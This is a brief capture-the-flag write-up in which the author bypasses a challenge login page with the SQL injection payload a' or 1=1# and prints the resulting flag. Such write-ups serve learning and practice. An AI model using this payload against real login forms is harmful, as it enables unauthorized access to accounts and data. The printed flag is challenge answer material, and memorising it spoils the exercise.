#### Let Me In 

![alt text](attachments/image.png)

We are greeted with a login page, first thing that I try is basic SQL injection, given that this question has lots of solves and 
is of less points, it must be something easy only

![alt text](attachments/image-1.png)

payload 
```text
a' or 1=1#
```
And we get the flag 

![alt text](attachments/image-2.png)

```sh
flag : flag{Tr3ndy_Tr0v3_$QL_1nj3ct10n}
```